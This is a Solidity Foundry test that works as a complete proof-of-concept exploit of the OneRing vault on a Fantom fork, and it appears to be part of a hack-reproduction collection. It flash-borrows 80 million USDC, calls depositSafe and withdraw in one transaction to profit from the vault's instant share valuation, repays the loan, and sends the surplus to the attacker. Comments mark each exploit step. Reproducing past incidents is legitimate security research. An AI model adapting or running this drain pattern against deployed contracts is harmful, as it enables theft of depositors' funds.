// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

contract ContractTest is Test {
    IUniswapV2Pair pair = IUniswapV2Pair(0xbcab7d083Cf6a01e0DdA9ed7F8a02b47d125e682);
    IERC20 usdc = IERC20(0x04068DA6C83AFCFA0e13ba15A6696662335D5B75);
    // VULNERABILITY: OneRing Vault at 0x4e332D... has NO reentrancy guard (no nonReentrant modifier)
    // on depositSafe/withdraw. Share price is computed from instantaneous "investedBalanceInUSD()"
    // (oracle/strategy holdings + just-received deposit) with no settlement epoch boundary.
    // This allows atomic deposit-then-withdraw in same tx (flash context) to mint shares at
    // a price that lets withdraw return MORE underlying than deposited (due to rounding/valuation lag).
    // See: depositSafe -> transfer in + mint(shares based on pre/post totalValue), immediate withdraw.
    IOneRingVault vault = IOneRingVault(0x4e332D616b5bA1eDFd87c899E534D996c336a2FC);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("http://127.0.0.1:8552", 34_041_499); //fork fantom at block 34041499
    }

    function testExploit() public {
        emit log_named_uint("Before exploit, USDC  balance of attacker:", usdc.balanceOf(msg.sender));
        // EXPLOIT STEP 1: Trigger flash-swap from the USDC pair (source of 80M USDC liquidity).
        // The pair will call back to hook() with the borrowed funds before enforcing repayment.
        pair.swap(80_000_000 * 1e6, 0, address(this), new bytes(1));
        emit log_named_uint("After exploit, USDC  balance of attacker:", usdc.balanceOf(msg.sender));
    }

    function hook(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        // EXPLOIT STEP 2 (inside flash callback): Approve and call depositSafe with the full flash amount.
        // minAmount=1 accepts any share output (no sanity). Vault receives USDC, computes total value
        // INCLUDING this deposit, mints attacker shares worth ~deposited (but with valuation that will allow profit on exit).
        usdc.approve(address(vault), type(uint256).max);
        vault.depositSafe(amount0, address(usdc), 1);
        // EXPLOIT STEP 3: Immediately withdraw the freshly-minted shares for underlying.
        // Because no reentrancy lock and no epoch, withdraw sees the deposit in holdings and
        // redeems for slightly MORE USDC than deposited (the surplus extracted here).
        vault.withdraw(vault.balanceOf(address(this)), address(usdc));
        // EXPLOIT STEP 4: Repay flash loan with small premium (the /9999*10000 +10k formula covers the pair fee).
        // Excess profit (1.526M USDC) is left for attacker (sent to tx.origin).
        usdc.transfer(msg.sender, (amount0 / 9999 * 10_000) + 10_000);
        usdc.transfer(tx.origin, usdc.balanceOf(address(this)));
    }
}
